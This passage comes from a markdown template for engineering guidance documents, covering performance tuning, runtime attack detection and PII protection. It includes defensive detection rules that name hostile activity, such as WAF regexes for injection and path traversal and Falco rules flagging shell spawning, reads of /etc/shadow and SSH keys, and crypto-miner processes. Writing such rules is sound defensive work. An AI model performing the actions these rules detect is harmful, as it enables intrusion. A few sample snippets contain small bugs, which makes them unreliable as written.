        ttl=300,  # 5 minutes
        value=json.dumps([resource])
    )
    return [resource]
```

**Cache Invalidation Strategy**:
```[language]
# ✅ GOOD: Invalidate on write
def update_[resource](id: str, data: dict):
    # Update database
    db.update_[resource](id, data)

    # Invalidate cache
    cache_key = f'[resource]:{id}'
    redis_client.delete(cache_key)

    # Also invalidate related caches
    redis_client.delete(f'[resource]_list:*')  # List cache
```
```

#### 5.6.3 Database Query Optimization

**Reference Section 4.2.3** for N+1 prevention and connection pooling. Expand with domain-specific patterns:

```markdown
### Query Optimization for [Domain]

**Indexing Strategy**:
```sql
-- ✅ Index frequently queried columns
CREATE INDEX idx_[table]_[field] ON [table]([field]);

-- ✅ Composite index for multi-column queries
CREATE INDEX idx_[table]_[field1]_[field2] ON [table]([field1], [field2]);

-- ✅ Partial index for filtered queries
CREATE INDEX idx_[table]_active ON [table]([field]) WHERE status = 'active';

-- ❌ DON'T: Over-index (slows writes, wastes storage)
```

**Query Performance Targets**:
| Query Type | Target (p99) | Action if Exceeded |
|------------|--------------|---------------------|
| Primary key lookup | <5ms | Check indexing |
| Indexed query | <50ms | Review index usage, add covering index |
| Full table scan | <500ms | Add index or refactor query |
| Aggregation | <200ms | Use materialized views |

**Slow Query Detection**:
```[language]
# ✅ Log slow queries automatically
[db_config]:
  slow_query_log: true
  slow_query_threshold: 100ms  # Log queries >100ms
  log_destination: '[monitoring_system]'
```
```

#### 5.6.4 API Performance Patterns

```markdown
### API Optimization

**Pagination (MANDATORY for List Endpoints)**:
```[language]
# ✅ Cursor-based pagination (scales to millions)
@app.get("/api/v1/[resources]")
def list_[resources](cursor: Optional[str] = None, limit: int = 20):
    if limit > 100:
        raise ValueError("Limit cannot exceed 100")

    query = db.query("[resources]")
    if cursor:
        # Decode cursor (base64 encoded timestamp or ID)
        decoded_cursor = base64.decode(cursor)
        query = query.where("[created_at] >", decoded_cursor)

    items = query.limit(limit + 1).execute()  # Fetch 1 extra to determine if more

    has_more = len(items) > limit
    items = items[:limit]

    next_cursor = None
    if has_more:
        next_cursor = base64.encode(items[-1].created_at)

    return {
        "items": items,
        "next_cursor": next_cursor,
        "has_more": has_more
    }
```

**Field Selection (Reduce Payload Size)**:
```[language]
# ✅ Allow clients to select fields
@app.get("/api/v1/[resources]/{id}")
def get_[resource](id: str, fields: Optional[str] = None):
    [resource] = db.query_[resource](id)

    if fields:
        # Return only requested fields: ?fields=id,name,email
        field_list = fields.split(',')
        return {k: v for k, v in [resource].items() if k in field_list}

    return [resource]  # Return all fields
```

**Response Compression**:
```[language]
# ✅ Enable gzip compression
[framework].config:
  compression:
    enabled: true
    min_size: 1024  # Only compress responses >1KB
    level: 6        # Balance speed vs compression ratio
```
```

#### 5.6.5 Scaling Patterns

```markdown
### Horizontal Scaling

**Stateless Design (MANDATORY)**:
```[language]
# ✅ GOOD: Stateless service (can scale horizontally)
class [Service]:
    def handle_request(self, request):
        # All state in database/cache, not in memory
        user_id = request.headers['user-id']
        session = redis.get(f'session:{user_id}')  # External state
        return self.process(session, request.data)

# ❌ BAD: Stateful service (cannot scale horizontally)
class [Service]:
    def __init__(self):
        self.user_sessions = {}  # In-memory state!

    def handle_request(self, request):
        # Different instances have different state
        session = self.user_sessions.get(request.user_id)
```

**Load Balancing**:
```[config_format]
# Load balancer configuration
load_balancer:
  algorithm: 'least_connections'  # Or 'round_robin', 'ip_hash'
  health_check:
    path: '/health'
    interval: 10s
    timeout: 2s
    unhealthy_threshold: 3
  instances:
    min: 2
    max: 10
    target_cpu: 70%  # Scale up when CPU >70%
```

**Auto-Scaling Rules**:
```[config_format]
autoscaling:
  metrics:
    - type: 'cpu'
      target: 70
    - type: 'memory'
      target: 80
    - type: 'request_rate'
      target: 1000  # requests per second per instance
  scale_up:
    cooldown: 300s  # Wait 5 min before scaling up again
    increment: 2    # Add 2 instances at a time
  scale_down:
    cooldown: 600s  # Wait 10 min before scaling down
    decrement: 1    # Remove 1 instance at a time
```
```

#### 5.6.6 Resource Optimization

```markdown
### Memory & CPU Optimization

**Memory Profiling**:
```[language]
# ✅ Profile memory usage in production
from [profiling_library] import memory_profiler

@memory_profiler
def process_large_dataset(data):
    # Function will be profiled
    results = []
    for item in data:
        results.append(transform(item))
    return results

# Better: Use generator for large datasets
def process_large_dataset_streaming(data):
    for item in data:
        yield transform(item)  # Processes one at a time
```

**Resource Limits**:
```[language]
# ✅ Set resource limits (prevent runaway processes)
[process_config]:
  limits:
    memory: '512MB'     # Max memory per instance
    cpu: '0.5'          # Max 0.5 CPU cores
    timeout: '30s'      # Max request processing time
    connections: 100    # Max concurrent connections
```

**Async I/O for I/O-Bound Operations**:
```[language]
# ❌ BAD: Synchronous I/O blocks threads
def fetch_[resources]():
    results = []
    for url in urls:
        response = requests.get(url)  # Blocks for each request
        results.append(response.json())
    return results

# ✅ GOOD: Async I/O allows concurrency
async def fetch_[resources]():
    async with aiohttp.ClientSession() as session:
        tasks = [session.get(url) for url in urls]
        responses = await asyncio.gather(*tasks)  # Parallel
        return [await r.json() for r in responses]
```
```

#### 5.6.7 Performance Monitoring

```markdown
### Continuous Performance Monitoring

**Key Metrics to Track**:
```[language]
# ✅ Track RED metrics (Rate, Errors, Duration)
metrics.counter('[service]_requests_total', tags={'endpoint': '[endpoint]', 'status': '[status]'})
metrics.counter('[service]_errors_total', tags={'endpoint': '[endpoint]', 'error_type': '[type]'})
metrics.histogram('[service]_request_duration_seconds', value, tags={'endpoint': '[endpoint]'})

# ✅ Track resource utilization
metrics.gauge('[service]_memory_usage_bytes', process.memory_info().rss)
metrics.gauge('[service]_cpu_usage_percent', psutil.cpu_percent())
metrics.gauge('[service]_active_connections', len(connection_pool.active))
```

**Performance Regression Detection**:
```[config_format]
# Alert on performance degradation
alerts:
  - name: 'API Latency Increase'
    condition: 'p99([service]_request_duration_seconds) > 500ms for 5 minutes'
    severity: 'warning'

  - name: 'Database Query Slowdown'
    condition: 'p99(database_query_duration_seconds) > 200ms for 5 minutes'
    severity: 'critical'

  - name: 'Cache Hit Rate Drop'
    condition: 'cache_hit_rate < 70% for 10 minutes'
    severity: 'warning'
```
```

#### 5.6.8 Performance Testing

```markdown
### Performance Test Suite

**Load Testing**:
```[language]
# ✅ Load test critical endpoints
# Using [k6/Locust/JMeter/etc]

[load_test_code]:
  scenario:
    - name: 'Sustained Load'
      duration: '10m'
      rate: '1000 req/s'  # Target rate

    - name: 'Spike Test'
      stages:
        - duration: '2m', target: '100 req/s'
        - duration: '1m', target: '5000 req/s'  # Spike
        - duration: '2m', target: '100 req/s'

    - name: 'Soak Test'
      duration: '4h'
      rate: '500 req/s'  # Extended duration

  thresholds:
    http_req_duration: ['p95<500', 'p99<1000']  # 95th <500ms, 99th <1s
    http_req_failed: ['rate<0.01']  # Error rate <1%
```

**Benchmarking**:
```[language]
# ✅ Benchmark critical functions
import timeit

def benchmark_[function]():
    setup = "[setup_code]"
    stmt = "[function_to_test]()"

    # Run 1000 times, repeat 5 times
    times = timeit.repeat(stmt, setup=setup, number=1000, repeat=5)

    print(f"Min: {min(times)*1000:.2f}ms")
    print(f"Avg: {sum(times)/len(times)*1000:.2f}ms")
    print(f"Max: {max(times)*1000:.2f}ms")
```
```

### 5.7 Code Quality Standards

[Continue with linting, formatting, complexity limits...]
```

---

### 5.11 Runtime Security & Attack Detection (MANDATORY for HIGH-risk)

**Template Instructions**:
- **MANDATORY FOR**: HIGH-risk domains (public-facing APIs, financial systems, healthcare, e-commerce)
- **RECOMMENDED FOR**: MEDIUM-risk domains
- **SKIP IF**: Internal tools, local-only applications, development utilities

**Content to Include**:

#### 5.11.1 Web Application Firewall (WAF) Rules

**Principle**: Block common attacks at perimeter before they reach application code.

```markdown
### WAF Configuration

**Cloud WAF** (AWS WAF / Cloudflare / Azure WAF):
```[config_format]
# WAF rules for [domain]
waf_rules:
  - name: 'Block SQL Injection'
    priority: 1
    rule_type: 'regex_pattern_set'
    patterns:
      - '(\bunion\b.*\bselect\b)'
      - '(\binsert\b.*\binto\b)'
      - '(\bdelete\b.*\bfrom\b)'
      - '(\bdrop\b.*\btable\b)'
      - '(--|\#|\/\*)'  # SQL comment injection
    action: 'block'
    log: true

  - name: 'Block XSS Attempts'
    priority: 2
    patterns:
      - '(<script[^>]*>)'
      - '(javascript:)'
      - '(on\w+\s*=)'  # Event handlers: onclick=, onload=
      - '(<iframe)'
    action: 'block'

  - name: 'Block XXE Attacks'
    priority: 3
    patterns:
      - '(<!ENTITY)'
      - '(<!DOCTYPE.*\[)'
      - '(SYSTEM\s+["\'])'
    action: 'block'

  - name: 'Block Path Traversal'
    priority: 4
    patterns:
      - '(\.\./)'
      - '(\.\.\\)'
      - '(%2e%2e%2f)'  # URL-encoded ../
      - '(%252e)'       # Double URL-encoded
    action: 'block'

  - name: 'Block Command Injection'
    priority: 5
    patterns:
      - '(\||&|;|\n|\r)'  # Shell operators
      - '(`|\$\()'         # Command substitution
    action: 'block'

  - name: 'Rate Limit Per IP'
    priority: 10
    condition: 'requests_per_minute > 100'
    action: 'challenge'  # CAPTCHA

  - name: 'Rate Limit Login Endpoint'
    priority: 11
    path: '/api/v1/auth/login'
    condition: 'requests_per_minute > 5'
    action: 'block'
    duration: '15m'  # Block IP for 15 minutes

  - name: 'Block Known Bad IPs'
    priority: 20
    source: 'threat_intelligence_feed'
    action: 'block'
```

**ModSecurity / OWASP Core Rule Set** (Open Source WAF):
```[config]
# Enable OWASP CRS
Include /etc/modsecurity/owasp-crs/*.conf

# Custom rules for [domain]
SecRule REQUEST_URI "@rx /api/admin" \
    "id:10001,\
    phase:1,\
    deny,\
    status:403,\
    msg:'Admin panel access from non-allowlisted IP',\
    chain"
SecRule REMOTE_ADDR "!@ipMatch 10.0.0.0/8,192.168.1.100"
```
```

#### 5.11.2 Runtime Application Self-Protection (RASP)

**Principle**: Embed security into application runtime to detect and block attacks in real-time.

```markdown
### RASP Implementation

**Agent-Based RASP**:
```[language]
# ✅ RASP agent initialization
from [rasp_library] import RASPAgent

rasp = RASPAgent(
    app_name='[service]',
    environment='production',
    rules=[
        # Detect SQL injection in runtime
        {
            'type': 'sql_injection',
            'action': 'block',
            'alert': True
        },
        # Detect suspicious file access
        {
            'type': 'path_traversal',
            'action': 'block',
            'alert': True
        },
        # Detect XXE attacks
        {
            'type': 'xxe',
            'action': 'block',
            'alert': True
        },
        # Detect deserialization attacks
        {
            'type': 'unsafe_deserialization',
            'action': 'block',
            'alert': True
        }
    ]
)

# RASP automatically instruments code
app = rasp.protect(flask_app)
```

**RASP vs WAF**:
| Feature | WAF | RASP |
|---------|-----|------|
| Location | Network perimeter | Inside application |
| Context | Request/response only | Full application context |
| False Positives | Higher (pattern-based) | Lower (context-aware) |
| Performance Impact | Minimal | Moderate |
| Deployment | Infrastructure | Application dependency |

**Use Both**: WAF blocks obvious attacks, RASP catches context-specific attacks that bypass WAF.
```

#### 5.11.3 Intrusion Detection System (IDS)

**Container Runtime Security**:
```markdown
### Falco Rules for Runtime Threat Detection

**Detect Suspicious Behavior in Containers**:
```yaml
# Detect shell execution in container
- rule: Shell Spawned in Container
  desc: Detect shell execution (potential compromise)
  condition: >
    spawned_process and
    container and
    proc.name in (bash, sh, zsh, ksh, dash)
  output: "Shell spawned in container (user=%user.name container=%container.name image=%container.image.repository)"
  priority: WARNING

# Detect file access in sensitive directories
- rule: Read Sensitive File
  desc: Detect access to sensitive files
  condition: >
    open_read and
    fd.name in (/etc/shadow, /etc/passwd, /etc/ssh/ssh_host_rsa_key)
  output: "Sensitive file read (user=%user.name file=%fd.name container=%container.name)"
  priority: CRITICAL

# Detect privilege escalation
- rule: Privilege Escalation Attempt
  desc: Detect sudo or su usage in container
  condition: >
    spawned_process and
    container and
    proc.name in (sudo, su)
  output: "Privilege escalation attempt (user=%user.name command=%proc.cmdline container=%container.name)"
  priority: CRITICAL

# Detect outbound connections to unexpected destinations
- rule: Unexpected Outbound Connection
  desc: Container connecting to unexpected IP
  condition: >
    outbound and
    container and
    not fd.sip in (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and
    not fd.sip.name in (known-api.example.com, logging.example.com)
  output: "Unexpected outbound connection (container=%container.name dest=%fd.sip:%fd.sport)"
  priority: WARNING

# Detect crypto mining activity
- rule: Crypto Mining Detected
  desc: Detect cryptocurrency mining processes
  condition: >
    spawned_process and
    proc.name in (xmrig, minergate, cpuminer, ccminer)
  output: "Crypto mining detected (user=%user.name process=%proc.name container=%container.name)"
  priority: CRITICAL
```

**Integration with SIEM**:
```[language]
# ✅ Forward Falco alerts to SIEM
falco_config:
  outputs:
    - type: 'syslog'
      endpoint: 'siem.example.com:514'
    - type: 'http'
      url: 'https://siem.example.com/api/v1/events'
      headers:
        Authorization: 'Bearer [API_KEY]'
```
```

#### 5.11.4 Security Information and Event Management (SIEM)

**Centralized Security Logging**:
```markdown
### SIEM Integration

**Log Forwarding**:
```[language]
# ✅ Forward security events to SIEM
import logging
from [siem_library] import SIEMHandler

# Configure SIEM handler
siem_handler = SIEMHandler(
    endpoint='https://siem.example.com/api/v1/logs',
    api_key=os.environ['SIEM_API_KEY'],
    source='[service]',
    environment='production'
)

# Security logger
security_logger = logging.getLogger('security')
security_logger.addHandler(siem_handler)
security_logger.setLevel(logging.INFO)

# Log security events
def log_security_event(event_type, details):
    security_logger.info(
        f"Security event: {event_type}",
        extra={
            'event_type': event_type,
            'user_id': details.get('user_id'),
            'ip_address': details.get('ip'),
            'endpoint': details.get('endpoint'),
            'action': details.get('action'),
            'result': details.get('result'),
            'timestamp': datetime.utcnow().isoformat()
        }
    )

# Usage
log_security_event('authentication_failure', {
    'user_id': 'user123',
    'ip': request.remote_addr,
    'endpoint': '/api/v1/auth/login',
    'action': 'login',
    'result': 'invalid_password'
})
```

**SIEM Correlation Rules**:
```[query_language]
# Detect brute force attack
alert_name: "Brute Force Attack Detected"
query: |
  event_type:authentication_failure
  | stats count by ip_address, user_id in last 5 minutes
  | where count > 10
action:
  - block_ip
  - alert_security_team

# Detect credential stuffing
alert_name: "Credential Stuffing Detected"
query: |
  event_type:authentication_failure
  | stats distinct_count(user_id) by ip_address in last 5 minutes
  | where distinct_count > 20
action:
  - block_ip
  - alert_security_team

# Detect data exfiltration
alert_name: "Possible Data Exfiltration"
query: |
  event_type:api_request
  | where endpoint contains "/api/v1/users/export"
  | stats sum(response_size_bytes) by user_id in last 10 minutes
  | where sum > 100000000  # 100MB
action:
  - alert_security_team
  - create_incident

# Detect privilege escalation
alert_name: "Privilege Escalation Attempt"
query: |
  event_type:authorization_change
  | where old_role != "admin" and new_role = "admin"
action:
  - alert_security_team_immediately
  - create_high_priority_incident
```

**Events to Log** (MANDATORY):
```[language]
# ✅ Log these security events
SECURITY_EVENTS = {
    'authentication_success': log_security_event,
    'authentication_failure': log_security_event,
    'authorization_success': log_security_event,
    'authorization_failure': log_security_event,
    'password_change': log_security_event,
    'mfa_enrollment': log_security_event,
    'mfa_bypass_attempt': log_security_event,
    'account_lockout': log_security_event,
    'privilege_escalation_attempt': log_security_event,
    'suspicious_activity': log_security_event,
    'rate_limit_exceeded': log_security_event,
    'waf_block': log_security_event,
    'data_access_anomaly': log_security_event,
}
```
```

#### 5.11.5 Anomaly Detection

**Behavioral Analysis**:
```markdown
### Machine Learning-Based Anomaly Detection

**Baseline Normal Behavior**:
```[language]
# ✅ Detect anomalous API usage
from [ml_library] import AnomalyDetector

# Train on normal behavior
detector = AnomalyDetector()
detector.train(historical_api_logs)

# Real-time detection
def check_anomaly(user_id, endpoint, timestamp):
    features = {
        'hour_of_day': timestamp.hour,
        'day_of_week': timestamp.weekday(),
        'endpoint': endpoint,
        'user_id': user_id,
        'requests_last_hour': get_request_count(user_id, last_hours=1),
        'unique_endpoints_accessed': get_unique_endpoints(user_id, last_hours=1)
    }

    anomaly_score = detector.predict(features)

    if anomaly_score > 0.8:  # High anomaly
        alert_security_team(f"Anomalous behavior detected for user {user_id}")
        # Optional: require re-authentication
        revoke_session(user_id)

# Examples of anomalies:
# - User accessing 100x more records than usual
# - User accessing data at unusual time (3 AM when usually 9-5)
# - User accessing endpoints never accessed before
# - API calls from unusual geographic location
```

**Data Access Patterns**:
```[language]
# ✅ Detect data scraping / mass data access
def detect_data_scraping(user_id, endpoint, records_accessed):
    # Get user's typical access pattern
    avg_records = get_avg_records_accessed(user_id, endpoint, days=30)
    std_dev = get_std_dev_records_accessed(user_id, endpoint, days=30)

    # Z-score: How many standard deviations from mean?
    z_score = (records_accessed - avg_records) / std_dev

    if z_score > 3:  # >3 standard deviations = very unusual
        alert_security_team({
            'user_id': user_id,
            'endpoint': endpoint,
            'records_accessed': records_accessed,
            'typical_access': avg_records,
            'z_score': z_score,
            'message': 'Possible data scraping or exfiltration attempt'
        })

        # Optional: Require additional verification
        return require_mfa_verification(user_id)
```
```

---

### 5.12 Data Privacy & Protection (MANDATORY for domains handling PII/PHI)

**Template Instructions**:
- **MANDATORY FOR**: HIGH-risk domains handling PII (Personally Identifiable Information) or PHI (Protected Health Information)
- **MANDATORY FOR**: Systems subject to GDPR, HIPAA, CCPA, or similar regulations
- **RECOMMENDED FOR**: Any domain collecting user data
- **SKIP IF**: No user data collected

**Content to Include**:

#### 5.12.1 PII Data Classification & Inventory

**Data Classification Levels**:
```markdown
### Data Classification for [Domain]

| Classification | Examples | Storage Requirements | Access Controls | Retention |
|----------------|----------|---------------------|-----------------|-----------|
| **PUBLIC** | Product catalog, marketing content | None | Public read | Indefinite |
| **INTERNAL** | API logs (anonymized), analytics | Access control | Authenticated users | 90 days |
| **CONFIDENTIAL** | Email addresses, names, phone numbers | Encryption at rest + TLS in transit | Authorized personnel only + audit logging | Per retention policy |
| **RESTRICTED** | SSN, credit cards, health records, biometrics | Column-level encryption + KMS + audit all access | Need-to-know basis + MFA + approval workflow | Minimum required by law |

**PII Inventory** (MANDATORY):
```[language]
# ✅ Document all PII fields
PII_FIELDS = {
    'users': {
        'email': 'CONFIDENTIAL',
        'full_name': 'CONFIDENTIAL',
        'phone': 'CONFIDENTIAL',
        'date_of_birth': 'CONFIDENTIAL',
        'ssn': 'RESTRICTED',           # Social Security Number
        'payment_info': 'RESTRICTED',
        'medical_records': 'RESTRICTED'  # PHI
    },
    'audit_logs': {
        'user_id': 'INTERNAL',  # Pseudonymous ID, not PII
        'ip_address': 'CONFIDENTIAL'  # Can be PII under GDPR
    }
}
```
```

#### 5.12.2 Encryption at Rest (MANDATORY for PII)

**Database-Level Encryption**:
```markdown
### Encryption Strategy

**Column-Level Encryption for RESTRICTED Data**:
```sql
-- ✅ Encrypt sensitive columns
CREATE TABLE users (
  id UUID PRIMARY KEY,
  email VARCHAR(255),
  full_name VARCHAR(255),

  -- Encrypted columns
  ssn_encrypted BYTEA NOT NULL,
  credit_card_encrypted BYTEA NOT NULL,

  -- Key rotation support
  encryption_key_id VARCHAR(50) NOT NULL,
  encrypted_at TIMESTAMP NOT NULL,

  created_at TIMESTAMP DEFAULT NOW()
);

-- Index on encrypted data requires special handling
CREATE INDEX idx_users_ssn_hash ON users(SHA256(ssn_encrypted));
```

**Application-Layer Encryption**:
```[language]
# ✅ Encrypt before storing, decrypt after retrieving
from cryptography.fernet import Fernet
import base64

class EncryptionService:
    def __init__(self, kms_client):
        self.kms = kms_client
        self.key_cache = {}  # Cache DEKs (Data Encryption Keys)

    def encrypt(self, plaintext: str, key_id: str = 'key-2024-01') -> dict:
        # Get or create DEK from KMS
        dek = self._get_data_encryption_key(key_id)
        fernet = Fernet(dek)

        # Encrypt
        ciphertext = fernet.encrypt(plaintext.encode())

        return {
            'ciphertext': base64.b64encode(ciphertext).decode(),
            'key_id': key_id,
            'encrypted_at': datetime.utcnow()
        }

    def decrypt(self, ciphertext: str, key_id: str) -> str:
        # Get DEK from KMS
        dek = self._get_data_encryption_key(key_id)
        fernet = Fernet(dek)

        # Decrypt
        plaintext_bytes = fernet.decrypt(base64.b64decode(ciphertext))
        return plaintext_bytes.decode()

    def _get_data_encryption_key(self, key_id: str) -> bytes:
        if key_id in self.key_cache:
            return self.key_cache[key_id]

        # Fetch from KMS
        response = self.kms.decrypt(key_id)
        dek = response['Plaintext']
        self.key_cache[key_id] = dek
        return dek

# Usage
encryption_service = EncryptionService(kms_client)

# Storing user SSN
encrypted_ssn = encryption_service.encrypt(user.ssn)
db.execute("""
    INSERT INTO users (id, ssn_encrypted, encryption_key_id, encrypted_at)
    VALUES (?, ?, ?, ?)
""", user.id, encrypted_ssn['ciphertext'], encrypted_ssn['key_id'], encrypted_ssn['encrypted_at'])

# Retrieving user SSN
row = db.query("SELECT ssn_encrypted, encryption_key_id FROM users WHERE id = ?", user_id)
ssn = encryption_service.decrypt(row['ssn_encrypted'], row['encryption_key_id'])
```

**File Storage Encryption**:
```[language]
# ✅ Encrypt files before storing in S3/blob storage
def upload_sensitive_document(file_content: bytes, user_id: str) -> str:
    # 1. Encrypt file
    encrypted_data = encryption_service.encrypt(file_content, key_id='docs-key-2024')

    # 2. Upload to encrypted bucket
    s3_client.put_object(
        Bucket='[sensitive-docs-encrypted]',
        Key=f'users/{user_id}/{uuid4()}.encrypted',
        Body=encrypted_data['ciphertext'],
        ServerSideEncryption='AES256',  # S3 server-side encryption as additional layer
        Metadata={
            'key-id': encrypted_data['key_id'],
            'user-id': user_id
        }
    )

    return file_key
```
```

#### 5.12.3 GDPR Compliance - Right to Deletion

**Complete Data Deletion** (Article 17):
```markdown
### Data Deletion Implementation

**Multi-System Deletion**:
```[language]
# ✅ Delete ALL user data across ALL systems
class DataDeletionService:
    def delete_user_data(self, user_id: str, reason: str = 'user_request'):
        """
        GDPR Article 17: Right to Erasure
        Delete all personal data within 30 days
        """
        # Create audit record BEFORE deletion
        audit_log.record({
            'event': 'data_deletion_started',
            'user_id': user_id,
            'reason': reason,
            'initiated_by': request.user.id,
            'timestamp': datetime.utcnow()
        })

        # 1. Delete from primary database
        self._delete_from_database(user_id)

        # 2. Delete from caches
        self._delete_from_cache(user_id)

        # 3. Delete from backups (mark for deletion)
        self._mark_backups_for_deletion(user_id)

        # 4. Delete from analytics (anonymize historical data)
        self._anonymize_analytics(user_id)

        # 5. Delete from logs (redact PII)
        self._redact_logs(user_id)

        # 6. Delete from third-party services
        self._delete_from_third_parties(user_id)

        # 7. Delete files/documents
        self._delete_user_files(user_id)

        # Final audit record
        audit_log.record({
            'event': 'data_deletion_completed',
            'user_id': user_id,
            'timestamp': datetime.utcnow()
        })

    def _delete_from_database(self, user_id: str):
        with db.transaction():
            # Delete user record
            db.execute("DELETE FROM users WHERE id = ?", user_id)

            # Delete related records
            db.execute("DELETE FROM user_sessions WHERE user_id = ?", user_id)
            db.execute("DELETE FROM user_preferences WHERE user_id = ?", user_id)
            db.execute("DELETE FROM user_notifications WHERE user_id = ?", user_id)

            # Anonymize transactional records (can't delete due to financial regulations)
            db.execute("""
                UPDATE orders
                SET user_id = 'DELETED',
                    email = 'deleted@privacy.local',
                    shipping_address = 'REDACTED'
                WHERE user_id = ?
            """, user_id)

    def _delete_from_cache(self, user_id: str):
        # Delete all user cache keys
        cache_keys = redis.keys(f"user:{user_id}:*")
        if cache_keys:
            redis.delete(*cache_keys)

    def _mark_backups_for_deletion(self, user_id: str):
        # Can't delete from immutable backups immediately
        # Mark for exclusion on restore
        backup_service.mark_for_exclusion({
            'user_id': user_id,
            'marked_at': datetime.utcnow(),
            'reason': 'gdpr_deletion'
        })

    def _anonymize_analytics(self, user_id: str):
        # Replace user_id with anonymous ID in historical analytics
        analytics_db.execute("""
            UPDATE events
            SET user_id = ?, pii_redacted = true
            WHERE user_id = ?
        """, f"anon_{hashlib.sha256(user_id.encode()).hexdigest()}", user_id)

    def _redact_logs(self, user_id: str):
        # Send redaction request to log aggregation service
        log_service.redact_pii(user_id)

    def _delete_from_third_parties(self, user_id: str):
        # Delete from email service
        email_service.delete_subscriber(user_id)

        # Delete from payment processor
        payment_processor.delete_customer(user_id)

        # Delete from analytics
        analytics_service.delete_user(user_id)

    def _delete_user_files(self, user_id: str):
        # Delete all files uploaded by user
        files = storage.list_objects(prefix=f'users/{user_id}/')
        for file in files:
            storage.delete_object(file.key)
```

**Deletion Verification**:
```[language]
# ✅ Verify complete deletion
def verify_user_deletion(user_id: str) -> dict:
    """Verify user data is fully deleted"""
    verification = {
        'user_id': user_id,
        'verified_at': datetime.utcnow(),
        'checks': {}
    }

    # Check database
    user_exists = db.query_one("SELECT COUNT(*) FROM users WHERE id = ?", user_id)
    verification['checks']['database'] = user_exists == 0

    # Check cache
    cache_keys = redis.keys(f"user:{user_id}:*")
    verification['checks']['cache'] = len(cache_keys) == 0

    # Check files
    files = storage.list_objects(prefix=f'users/{user_id}/')
    verification['checks']['files'] = len(files) == 0

    verification['complete'] = all(verification['checks'].values())
    return verification
```
```

#### 5.12.4 PII in Logs (NEVER LOG - MANDATORY)

**Log Sanitization**:
```markdown
### Preventing PII in Logs

**Automatic PII Redaction**:
```[language]
# ✅ Redact PII before logging
import re

class PIISanitizer:
    PII_PATTERNS = {
        'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
        'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
        'credit_card': r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',
        'phone': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
        'ip_address': r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
    }

    @staticmethod
    def sanitize(message: str) -> str:
        """Remove PII from log messages"""
        sanitized = message

        for pii_type, pattern in PIISanitizer.PII_PATTERNS.items():
            sanitized = re.sub(pattern, f'[{pii_type.upper()}_REDACTED]', sanitized)

        return sanitized

# Logging wrapper
class PrivacyAwareLogger:
    def __init__(self, logger):
        self.logger = logger

    def info(self, message, *args, **kwargs):
        sanitized = PIISanitizer.sanitize(message)
        self.logger.info(sanitized, *args, **kwargs)

    def error(self, message, *args, **kwargs):
        sanitized = PIISanitizer.sanitize(message)
        self.logger.error(sanitized, *args, **kwargs)

# Usage
logger = PrivacyAwareLogger(logging.getLogger(__name__))

# ❌ This would log PII
# logger.info(f"User email: {user.email}")

# ✅ This redacts PII automatically
logger.info(f"User email: {user.email}")  # Logs: "User email: [EMAIL_REDACTED]"
```

**Structured Logging with PII Fields**:
```[language]
# ✅ Separate PII from logs
logger.info(
    "User login successful",
    extra={
        'user_id': user.id,  # OK: Pseudonymous ID
        'ip_hash': hashlib.sha256(request.ip.encode()).hexdigest()[:16],  # OK: Hashed IP
        'endpoint': '/api/v1/auth/login',
        # ❌ NEVER include: email, name, SSN, etc.
    }
)
```
```

#### 5.12.5 Data Retention Policies

**Automated Data Purging**:
```markdown
### Data Retention Implementation

**Retention Periods** (adjust per legal requirements):
| Data Type | Retention Period | Deletion Method |
|-----------|------------------|-----------------|
| User account data | Until account deletion + 30 days | Complete deletion |
| Session logs | 90 days | Automatic purge |
| Audit logs (security) | 7 years | Archived then deleted |
| Financial records | 7 years | Archived (anonymized after 2 years) |
| Marketing emails | Until unsubscribe + 30 days | Complete deletion |
| Analytics (anonymized) | 2 years | Automatic purge |

**Automated Purge Jobs**:
```[language]
# ✅ Scheduled data retention enforcement
def purge_expired_data():
    """Run daily to enforce retention policies"""

    # 1. Delete old session logs
    db.execute("""
        DELETE FROM session_logs
        WHERE created_at < NOW() - INTERVAL '90 days'
    """)

    # 2. Delete expired user deletion requests (30 days grace period)
    db.execute("""
        DELETE FROM users
        WHERE deleted_at IS NOT NULL
        AND deleted_at < NOW() - INTERVAL '30 days'
    """)

    # 3. Anonymize old analytics
    db.execute("""
        UPDATE analytics_events
        SET user_id = 'anonymized', ip_address = NULL
        WHERE created_at < NOW() - INTERVAL '2 years'
        AND user_id != 'anonymized'
    """)

    # 4. Purge old logs from log aggregation service
    log_service.delete_logs_older_than(days=90)

    # Audit
    audit_log.record({
        'event': 'data_retention_enforcement',
        'timestamp': datetime.utcnow()
    })

# Schedule daily
schedule.every().day.at("02:00").do(purge_expired_data)
```
```

---

## 6. Testing, Validation & Monitoring

**Template Instructions**: Comprehensive testing and observability strategy for this domain.

**MANDATORY Subsections**:
- **6.1**: Security Testing (SAST, DAST, dependency scanning, fuzzing)
- **6.2**: Testing Methodologies & Strategy (TDD, Property-Based, BDD/ATDD, Mutation Testing)
- **6.3**: Unit & Integration Testing
- **6.4**: Security Test Examples (auth bypass, injection, authz)
- **6.5**: Observability Implementation (logs, metrics, tracing)

**STRONGLY RECOMMENDED**:
- **6.6**: Property-Based Testing (for complex invariants) - NOTE: Brief version in 6.2, expand here if critical
- **6.7**: Performance & Load Testing

---

### 6.1 Security Testing Requirements

**🚨 VALIDATION GATE: Security Testing Completeness 🚨**

**BLOCKING for HIGH-RISK domains**

---

### Security Testing Validation Protocol

For HIGH-RISK domains, Claude MUST ensure comprehensive security testing coverage.

**MANDATORY Validation (HIGH-RISK):**

```python
required_security_tests = {
    "injection_tests": {
        "sql_injection": check_sql_injection_tests(),
        "nosql_injection": check_nosql_injection_tests(),  # if applicable
        "command_injection": check_command_injection_tests(),
    },
    "authentication_tests": {
        "bypass_attempts": check_auth_bypass_tests(),
        "token_validation": check_token_tests(),
        "session_management": check_session_tests(),
    },
    "authorization_tests": {
        "access_control": check_authz_tests(),
        "privilege_escalation": check_privilege_escalation_tests(),
        "resource_access": check_resource_authz_tests(),
    },
    "input_validation_tests": {
        "boundary_tests": check_boundary_value_tests(),
        "fuzzing": check_fuzzing_examples(),  # if applicable
        "malformed_input": check_malformed_input_tests(),
    }
}

def validate_security_testing(skill_content, risk_level):
    """
    Validate security testing coverage.
    BLOCKING for HIGH-RISK domains.
    """

    if risk_level != "HIGH":
